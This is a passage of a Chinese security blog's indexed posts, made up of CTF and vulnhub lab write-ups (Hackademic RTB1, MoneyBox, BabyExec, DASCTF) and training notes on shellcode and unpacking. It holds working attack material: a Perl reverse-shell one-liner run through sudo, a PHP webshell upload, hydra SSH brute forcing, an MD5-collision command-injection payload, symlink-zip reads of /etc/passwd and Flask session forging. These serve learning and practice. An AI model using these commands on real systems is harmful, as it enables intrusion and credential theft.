pdf_list\r# return re_2\rpdf_list = get_pdf('http://111.200.241.244:52051/')\rprint(pdf_list)\rfor i in pdf_list:\ros.system('wget '+i)\r然后识别PDF内容并进行密码对冲，这里有一个坑，/pdfminer/converter.py中的line 49, self.pageno += 1需要修改为self.pageno += str(1)。 from io import StringIO #python3 from pdfminer.pdfpage import PDFPage from pdfminer.converter import TextConverter from pdfminer.converter import PDFPageAggregator from pdfminer.layout import LTTextBoxHorizontal, LAParams from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter import sys import string import os import hashlib import importlib import random from urllib.request import urlopen from urllib.request import Request def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_to_txt(path_to_file): rsrcmgr = PDFResourceManager() retstr = StringIO() codec = 'utf-8' laparams = LAParams() device = TextConverter(rsrcmgr, retstr, codec, laparams) fp = open(path_to_file, 'rb') interpreter = PDFPageInterpreter(rsrcmgr, device) password = \"\" maxpages = 0 caching = True pagenos=set() for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True): interpreter.process_page(page) text = retstr.getvalue() fp.close() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print (\"Searching word in \" + i) pdf_text = convert_pdf_to_txt(\"./\"+i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word.encode('utf-8')+'Salz!'.encode('utf-8')).hexdigest() if (sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c'): print (\"Find the password :\" + word) exit() if __name__ == \"__main__\": find_password() ","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:4:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["WriteUp"],"content":"0x04 leaking 打开页面，分析代码。 \"use strict\";\rvar randomstring = require(\"randomstring\");\rvar express = require(\"express\");\rvar {\rVM\r} = require(\"vm2\");\rvar fs = require(\"fs\");\rvar app = express();\rvar flag = require(\"./config.js\").flag\rapp.get(\"/\", function(req, res) {\rres.header(\"Content-Type\", \"text/plain\");\r/* Orange is so kind so he put the flag here. But if you can guess correctly :P */\reval(\"var flag_\" + randomstring.generate(64) + \" = \\\"flag{\" + flag + \"}\\\";\")\rif (req.query.data \u0026\u0026 req.query.data.length \u003c= 12) {\rvar vm = new VM({\rtimeout: 1000\r});\rconsole.log(req.query.data);\rres.send(\"eval -\u003e\" + vm.run(req.query.data));\r} else {\rres.send(fs.readFileSync(__filename).toString());\r}\r});\rapp.listen(3000, function() {\rconsole.log(\"listening on port 3000!\");\r});\r完全没有头绪，参考wp才知道这是道关于node.js沙箱逃逸的题，首先定义变量 flag，然后可以在沙箱里面执行任意的命令。如果我们能够构造请求，使得vm上下文代替我们去读取利用沙箱外的代码和变量的话，那就形成了沙箱逃逸。基本原理参考：https://blog.csdn.net/qq_41903941/article/details/109379205。不过这题没用到原型链，直接用Buffer()函数用于读取内存的内容，可以通过这个函数直接去读取全局内存中的内容。在较早一点的node版本中(8.0之前),当 Buffer的构造函数传入数字时,会得到与数字长度一致的一个 Buffer,并且这个Buffer是未清零的。8.0之后的版本可以通过另一个函数Buffer. allocUnsafe(size)来获得未清空的内存。 # encoding=utf-8\rimport requests\rimport time\rurl = 'http://your ip:port/?data=Buffer(500)'\rresponse = ''\rwhile 'flag' not in response:\rreq = requests.get(url)\rresponse = req.text\rprint(req.status_code)\rtime.sleep(0.1)\rif 'flag{' in response:\rprint(response)\rbreak\r由于内存的保护机制，并不是每一次都能读取到含有flag内容的代码的，多运行几次脚本就好了。 ","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:5:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["安全技术"],"content":"\r","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-Hackademic: RTB1","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/"},{"categories":["安全技术"],"content":"0x00 准备工作 Description里面有一条信息，After all, try to read the contents of the file ‘key.txt’ in the root directory.VMware提示选择“我已移动该虚拟机”，设置NAT后重启。 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-Hackademic: RTB1","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/"},{"categories":["安全技术"],"content":"0x01 key.txt 通过二层地址发现靶机的三层IP地址，nmap扫描发现只开放了80端口，这应该是一台web漏洞的靶机。 浏览器访问页面 点击超链接跳转，站内链接给出了目标，与描述一致。 点击Uncategorized，url为http://192.168.92.133/Hackademic_RTB1/?cat=1，怀疑存在SQL注入。输入’，确实报错。 SqlMap一把梭，得到数据库。 进一步获取表，字段，最后得到如下的账号密码，最后一个密码的md5在线解密后得到PUPPIES。 dirsearch找到 wordpress 的后台。 开始登录权限最高的用户，进行测试。 然后到Options-\u003eMiscellaneous可以设置Allow File Uploads，并在Allowed file extensions添加php。 利用kali自带的webshell,/usr/share/webshells/php-reverse-shell.php。 cp /usr/share/webshells/php/php-reverse-shell.php .\rvim php-reverse-shell.ph\r#修改ip\r上传木马成功 监听目标端口，浏览器访问给出的路径地址。id发现此时的权限为apache的权限，需要进一步提权，uname -a显示电脑以及操作系统的内核的全部信息。 “searchsploit”是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。构造searchsploit 2.6.3 | grep \"Local Privilege Escalation\"搜索提权的exp。 复制15285.c到网页存储位置，开启apache服务。 下载exp，并编译运行。 成功读取到内容 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-Hackademic: RTB1","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/"},{"categories":["安全技术"],"content":"0x00 准备工作 靶场目标获取3个flag，难度简单。在vulnhub上下载靶机的ovf文件，先用VMware部署，发现访问不到靶机的ip，更换VirtualBox部署，关闭usb设备，网络设置为同一个NAT网络，即可。 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-MoneyBox","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/"},{"categories":["安全技术"],"content":"0x01 flag1 通过二层扫描（arp-scan）同网段的存活IP，使用arp-scan -I eth0 -l， -I 网卡 -l 本地网络，找到靶机的ip为10.0.2.15 使用nmap -p- 10.0.2.15扫描所有端口。 对这些端口进行服务识别，sV：版本检测是用来扫描目标主机和端口上运行的软件的版本。nmap -p21,22,80 -sV 10.0.2.15。 使用nmap -p21 -sC 10.0.2.15，sC：根据端口识别服务自动调用默认脚本。扫描发现，存在FTP匿名登录的漏洞。 SSH和HTTP服务无异常。 FTP连接，以Anonymous登录，密码为空，查看当前目录下的文件，发现有trytofind.jpg文件，可能隐藏信息，get到本机上。 图片没有明显的信息 SSH服务可能需要暴力破解，渗透前期不推荐，看80端口的网页，web服务和源代码也没有啥信息，但提示不需要想得太复杂。 使用dirsearch扫描下目录，发现有一个响应码为301 的/blogs目录。 浏览器访问，网页信息显示已经被黑掉了，有一个hint。 查看源代码，发现有个隐藏文件。 访问文件，在源代码里面放了密钥。 通过strings命令发现图片中存在异常字符。 用steghide提取隐藏信息，输入之前获取的密钥，确实存在data.txt。 使用steghide extract -sf trytofind.jpg，提取信息。发现存在一个用户renu，密码很弱。 ssh字典爆破一下，先建立一个user.txt，echo renu \u003e user.txt，再找一个密码字典。 用nmap的ssh爆破脚本，运行一段时间后，没有响应了。 nmap --script ssh-brute --script-args userdb=user.txt,passdb=rockyou.txt 10.0.2.15\r更换hydra hydra -l renu -P rockyou.txt 10.0.2.15 ssh\r顺利找到密码 ssh登录 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-MoneyBox","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/"},{"categories":["安全技术"],"content":"0x02 flag2 尝试sudo到root用户，由于不属于超级用户组，没有足够的权限。 查看历史命令，home目录下有lily目录，而home 目录用于存放用户文件。 切换到对应目录，得到flag。 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/:3:0","tags":["渗透测试","Web安全"],"title":"打靶-MoneyBox","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/"},{"categories":["安全技术"],"content":"0x03 flag3 回到之前的history，发现renu把自己生成的ssh的密钥拷贝到了192.168.43.80的lily账号下，怀疑可以通过公钥身份认证登录到lily账号上。 查看在.ssh里查看公钥和私钥文件,lily的authorized_keys存在renu的公钥。 因此renu可以直接通过ssh登陆到lily账号。 继续查看history，发现sudo -l命令经常出现。显示出自己（执行 sudo 的使用者）的权限，lily用户可以在不需要密码的情况下使用Perl程序。 可以利用perl编写反弹shell的脚本 sudo perl -e 'use Socket;$i=\"10.0.2.4\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' 在kali上监听2333端口 nc -nvlp 2333\r-g\u003c网关\u003e 设置路由器跃程通信网关，最丢哦可设置8个。\r-G\u003c指向器数目\u003e 设置来源路由指向器，其数值为4的倍数。\r-h 在线帮助。\r-i\u003c延迟秒数\u003e 设置时间间隔，以便传送信息及扫描通信端口。\r-l 使用监听模式，管控传入的资料。\r-n 直接使用IP地址，而不通过域名服务器。\r-o\u003c输出文件\u003e 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。\r-p\u003c通信端口\u003e 设置本地主机使用的通信端口。\r-r 乱数指定本地与远端主机的通信端口。\r-s\u003c来源位址\u003e 设置本地主机送出数据包的IP地址。\r-u 使用UDP传输协议。\r-v 显示指令执行过程。\r-w\u003c超时秒数\u003e 设置等待连线的时间。\r-z 使用0输入/输出模式，只在扫描通信端口时使用。\r连接成功，获得root权限 进入root根目录，发现隐藏的.root.txt文件。 ","date":"2021-09-16","objectID":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/:4:0","tags":["渗透测试","Web安全"],"title":"打靶-MoneyBox","uri":"/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/"},{"categories":["WriteUp"],"content":"没有注册码，刷一个，首先分析源代码。 \u003c?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rif ((string)$_GET['x'] !== (string)$_GET['y'] \u0026\u0026 md5($_GET['x']) === md5($_GET['y'])) { if(!isset($_GET['shell'])){ echo \"Attack me!\"; } else { $shell = $_GET['shell']; if(!preg_match(\"/[a-zA-Z0-9_$@]+/\",$shell)){ eval($shell); } else { die('No,No,No! Keep it up......'); } }}\relse { die(\"No, way!\");}\r?\u003e\r(string)$_GET['x'] !== (string)$_GET['y'] \u0026\u0026 md5($_GET['x']) === md5($_GET['y'] 需要md5强碰撞来绕过。参照之前代码审计的学习。构造payload如下： x=%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wi%C9r%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DBw4rH%D6%1B%8A%23%11%7C%D5%D8G%DE%8F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40%F9%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr~W%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3Bf%2AQ%05%EC \u0026y=%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wiIr%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DB%F74rH%D6%1B%8A%23%11%7C%D5%D8G%DE%0F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40y%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr%FEV%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3B%E6%2AQ%05%EC 然后是无数字字母的命令执行，还绕过了_$@。 采用通配符绕过美元符号（$）\rshell=?\u003e\u003c?=`/???/??? /????`?\u003e\r或者\rshell=?%3E%3C?=`/???/???%20/????`?%3E\r在底部发现flag ","date":"2021-09-15","objectID":"/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/:0:0","tags":["CTF","Web安全"],"title":"pwnhub公开赛-【迎中秋】BabyExec","uri":"/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/"},{"categories":["WriteUp"],"content":"\r","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:0:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x00 easymath 题目代码 assert(len(open('flag.txt', 'rb').read()) \u003c 50) assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') \u003c\u003c 10000).endswith( '1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008')) 简单搜索，发现https://ctftime.org/writeup/22374有道类似的题目，修改后跑一下脚本。 c = 1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008 mod = 5 ** 175 phi = 5 ** 175 - 5 ** 174 inv = pow(pow(2, 10000, mod), phi - 1, mod) print(((c * inv) % mod).to_bytes(50, byteorder='big')) ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:1:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 寒王’s blog 题目：http://hanwang2333.gitee.io/ 你滴寒王写了blog，看看寒王不小心留下了什么信息？ 猜测需要找到flag.jpg 扫描后台没有结果，因为blog是部署在码云上的，所以去看看。果然在一个分支里面找到了。 按照blog上的操作解密一下，得到flag{50aa7fe02602264e7d8102746416cd74}。 ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:2:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 py 下载下来是个py.exe，没做过这种逆向的，参考https://www.cnblogs.com/pluie/p/13621823.html和https://blog.csdn.net/weixin_44013208/article/details/88544142，用pyinstxtractor把exe转为pyc文件。 找到py文件，在用010editor打开，插入03F30D0A000000，将其重命名为py.pyc。 再用如下命令，转成python程序 uncompyle6 -o 生成文件.py 目标文件.pyc\r代码： def encode(s):\rstr = ''\rfor i in range(len(s)):\rres = ord(s[i]) ^ 32\rres += 31\rstr += chr(res)\rreturn str\rm = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'\rstrings = ''\rstrings = input('Input:')\rif encode(strings) == m:\rprint 'Correct!'\relse:\rprint 'Try again!'\r写个简单的解密 m = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'\rstr = ''\rfor i in range(len(m)):\rres = ord(m[i]) - 31\rres = res ^ 32\rstr += chr(res)\rprint (str)\r得到结果flag{24c4d6f158cacea10d379f711f8d6e2a} ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:3:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 apkrev 用模拟器打开 jeb反编译后发现，加密函数和密文都在libnative-test.so这个文件里面。 找到x86下对应的文件，进入ida分析，在函数窗口搜索mycheck就能定位。 貌似需要用到动态调试，这里先留一个坑。https://blog.csdn.net/freeking101/article/details/106701908、https://bbs.pediy.com/thread-269129.htm ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:4:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x04 babypython[国赛总决赛复现] 这题拿了先搜一下，发现和[HCTF 2018]Hide and seek很相似，于是参考文章。 创建一个软链接指向服务器上的文件，试试看能不能读取。 ln -s /etc/passwd link1\rzip -y link1.zip link1\r发现成功读到了。 尝试读取/proc/self/environ提示you bad bad!，怀疑这里被过滤了。 linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，\r内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。\rmaps 记录一些调用的扩展或者自定义 so 文件\renviron 环境变量\rcomm 当前进程运行的程序\rcmdline 程序运行的绝对路径\rcpuset docker 环境可以看 machine ID\rcgroup docker环境下全是 machine ID 不太常用\r根据之前的writeup，admin账号应该就是靠cookie或者session验证的，所以查看一下页面cookie信息。确实发现了一个session。 在https://jwt.io/#debugger-io上面解析一下。 参考大佬的过程https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe，是通过/app/y0u_found_it.ini来获取，不是很能理解为什么跳到这一步了。这里尝试绕过，但没有成功，迷茫。不过省去这两步，直接当原题套过程也能拿到flag。 接着试/app/y0u_found_it/y0u_found_it_main.py，获取到源代码。 # -*- coding: utf-8 -*-\rfrom flask import Flask,session,render_template,redirect, url_for, escape, request,Response\rimport uuid\rimport base64\rimport random\rimport secret\rfrom werkzeug.utils import secure_filename\rimport os\rrandom.seed(uuid.getnode())\rapp = Flask(__name__)\rapp.config['SECRET_KEY'] = str(random.random()*100)\rapp.config['UPLOAD_FOLDER'] = './uploads'\rapp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\rALLOWED_EXTENSIONS = set(['zip'])\rdef allowed_file(filename):\rreturn '.' in filename and \\\rfilename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\r@app.route('/', methods=['GET'])\rdef index():\rerror = request.args.get('error', '')\rif(error == '1'):\rsession.pop('username', None)\rreturn render_template('index.html', forbidden=1)\rif not 'username' in session:\rsession['username'] = \"guest\"\rif 'username' in session:\rreturn render_template('index.html', user=session['username'], secret=secret.secret)\relse:\rreturn render_template('index.html')\r@app.route('/upload', methods=['POST'])\rdef upload_file():\rif 'the_file' not in request.files:\rreturn redirect(url_for('index'))\rfile = request.files['the_file']\rif file.filename == '':\rreturn redirect(url_for('index'))\rif file and allowed_file(file.filename):\rfilename = secure_filename(file.filename)\rfile_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\rif(os.path.exists(file_save_path)):\rreturn 'This file already exists'\rfile.save(file_save_path)\relse:\rreturn 'This file is not a zipfile'\rtry:\rextract_path = file_save_path + '_'\ros.system('unzip -n ' + file_save_path + ' -d '+ extract_path)\rread_obj = os.popen('cat ' + extract_path + '/*')\rfile = read_obj.read()\rread_obj.close()\ros.system('rm -rf ' + extract_path)\rexcept Exception as e:\rfile = None\ros.remove(file_save_path)\rif(file != None):\rif(file.find(base64.b64decode('ZmxhZw==').decode('utf-8')) != -1):\rreturn redirect(url_for('index', error=1))\rreturn Response(file)\rif __name__ == '__main__':\r#app.run(debug=True)\rapp.run(host='127.0.0.1', debug=False, port=10008)\r分析app.config['SECRET_KEY'] = str(random.random()*100)可以发现，所谓的SECRET_KEY是由随机数生成的一串字符串，而设置随机数种子的random.seed(uuid.getnode())的函数可以获取网卡mac地址并转换成十进制数返回，进而生成伪随机数。查找资料发现，可以通过/sys/class/net/eth0/address来获取MAC地址。 获取到为02:42:ac:10:98:e8，跑下一脚本 import uuid\rimport random\rmac = \"02:42:ac:10:98:e8\"\rtemp = mac.split(':')\rtemp = [int(i,16) for i in temp]\rtemp = [bin(i).replace('0b','').zfill(8) for i in temp]\rtemp = ''.join(temp)\rmac = int(temp,2)\rrandom.seed(mac)\rrandStr = str(random.random()*100)\rprint(randStr)\r得到结果77.82254010793636，再用flask-session-cookie-manager工具加密下，得到admin的sessio。 python3 flask_session_cookie_manager3.py encode -s '77.82254010793636' -t \"{u'username':u'admin'}\"\rbp抓包提交下 ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:5:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x05 stealer 题目：那女孩对我说说我是一个小偷 打开后dns and ip.src==172.27.221.13过滤一下，发现存在base64的图片 使用tshark -r \"dump.pcapng\" -R \"dns and ip.src==172.27.221.13\" -2 -T fields -e _ws.col.Info\u003e1.txt命令提取所有的info字段。然后进行处理 操作：\r1、去除多余字符串”Standard query 0x.* A”、”ctf.com.cn OPT”、”-.”、“.”\r2、将“*”替换为“+”\r3、去掉换行\r然后丢到cyberchef里面去 ","date":"2021-08-31","objectID":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/:6:0","tags":["CTF"],"title":"DASCTF八月挑战赛writeup","uri":"/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/"},{"categories":["学习","安全技术"],"content":"\r## 0x00 shellcode从0到1\rLinux系统调用表 https://github.com/torvalds/linux/tree/master/arch/x86/entry/syscalls https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md ","date":"2021-08-27","objectID":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/:0:0","tags":null,"title":"2021年暑期夏令营笔记(day7-day8)","uri":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/"},{"categories":["学习","安全技术"],"content":"0x01 Windows平台下的shellcode利用 Windows下的Shellcode 优势：使用起来非常灵活，且易变形 劣势：开发困难 难点：如何动态定位API函数地址 API HASH https://neil-fox.github.io/Anti-analysis-using-api-hashing/ 在常规编程中,只需引入其头文件,便可调用某API函数,编译器在编译过程中会将相关信息编译到PE文件中(这里的相关信息主要是指 MAGE_IMPORT_DESCRIPTORS结构体)。当程序执行时,操作系统会将PE文件映射到内存,这个映射过程包括调用 LoadLibrary加载相应的动态链接库,以及调用 GetProcAddress取所有AP函数在内存中的地址,像这样的dll加载方式,我们称为隐式链接。 ShellCode开源框架 https://github.com/mai1zhi2/ShellCodeFramework 实操 https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html 实战视角 msf生成弹出calc一段shellcode分析 Metasploit \u0026 CobaltStrike 的shellcode分析 在APT攻击中,有对现有 shellcode的利用,如海莲花组织利用CS的 shellcode进行攻击，同时,某些APT组织也会开发一些特定的 shellcode 推荐资料： 逆向工程核心原理 Windows核心编程 https://securitycafe.ro/?s=shellcode+development ","date":"2021-08-27","objectID":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/:1:0","tags":null,"title":"2021年暑期夏令营笔记(day7-day8)","uri":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/"},{"categories":["学习","安全技术"],"content":"0x02 加壳 原理： 原程序最开始运行的一段代码是原始入口点，加壳之后只要先把壳代码运行再跳转到入口点，原程序依然正常运行。而在壳代码中就可以对原程序进行加解密等操作。 目的：使反汇编和反编译变得尽可能复杂，“反”出来结果尽可能无意义，甚至根本就“反”不出来。 结果：静态反汇编的代码无意义，需要动态分析。 壳的分类： 1.压缩壳 2.加密壳 3.虚拟机壳 加壳后的区别： 入口点不同 区段名会变 区段大小会变 在32位系统下，操作系统给每一个应用程序都分配了4gb的存储空间（虚拟存储空间），仅仅是exe就不需要考虑这个问 题，但是很多exe会加载动态链接库（.dll） exe基址： dll基址： 为什么是需要重定位： 1、对与exe，exe首先会加载到内存，每个文件总是使用独立的虚拟内存空间，这就意味着exe文件就不需要考虑基址重定位的问题 2、对于dll，在一个4gb虚拟内存里有多个dll，不能保证每次都加载到同样的位置，存在被其他dll占用的问题 3、对于系统的dll，实际上不会发生重定位 随机基址(alsr) 恶意代码bypass alsr、bypass dep等等，windows vista之后才有的机制（原因：针对缓冲区溢出的保护机制，从NT6.0开 始使用） windows7上：程序重启就能随机基址，基址会变化 windows10：重启的系统，基址会变化 开启条件：程序（vs中可以查看）+操作系统（windows7之后） exe程序开启alsr和没有开启有什么区别？（都能执行） 1、区段数量不一样 2、文件头的characteristic中的重定位信息标志 3、可选头（option header）中的dllcharacteristic的dymaic_base标志 4、区段不一样 如何去掉随机基址？ 修改两个字段： 汇编代码知识 一个简单的壳： 添加区段 在区段中添加跳转到oep的汇编代码 修改原程序的oep为添加的区段中的代码的地址 一般情况下加壳的流程： 保存寄存器环境 加载一些必要的API 解密代码和数据 修复重定位 填充IAT 恢复寄存器环境 ","date":"2021-08-27","objectID":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/:2:0","tags":null,"title":"2021年暑期夏令营笔记(day7-day8)","uri":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/"},{"categories":["学习","安全技术"],"content":"0x03 脱壳 脱壳的方法 寻找原始OEP dump内存到文件 修复文件 1、esp定律 有了ESP定律，可以方便我们脱掉大多数的压缩壳。 2、单步跟踪 利用OD的单条指令执行功能，从壳的入口一直执行到OEP，最终通过这个OEP将原程序dump出来。然当，在单步跟踪的时候需要跳过一些不能执行到的指令。 3、其他：https://www.52pojie.cn/thread-259984-1-1.html 脱壳相关工具 OD：动态调试 ImportRec：修复IAT PEID、exeinfo：查壳 脱压缩壳 Esp定律： 步过保存寄存器的指令，在esp寄存器上下硬件断点，然后运行起来，单步几步找到oep 使用OD插件Ollydump或者OllydumpEx，转存 使用ImportRec修复IAT 脱加密壳 解密IAT与脱壳分析 脱壳脚本的编写 脱反调试壳 搭建异常触发环境 分析触发的异常 寻找原始OEP 寻找写入IAT和获取API地址的点 编写脚本修复IAT 使用通用导入表修复工具修复IAT引用代码 脱反虚拟机壳 修改虚拟机配置 对偷取OEP的修复 对IAT调用的修复 虚拟机保护壳-VMP 虚拟机保护代码技术是将x86汇编指令转换为字节码指令，并且通过自己设计的解释器去执行字节码指令的一项技术，以达到保护原有指令不被轻易逆向和篡改 手工脱壳之未知加密壳 老师博客：https://www.yuque.com/hackdoors ","date":"2021-08-27","objectID":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/:3:0","tags":null,"title":"2021年暑期夏令营笔记(day7-day8)","uri":"/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/"},{"categories":["WriteUp"],"content":"\r","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:0:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5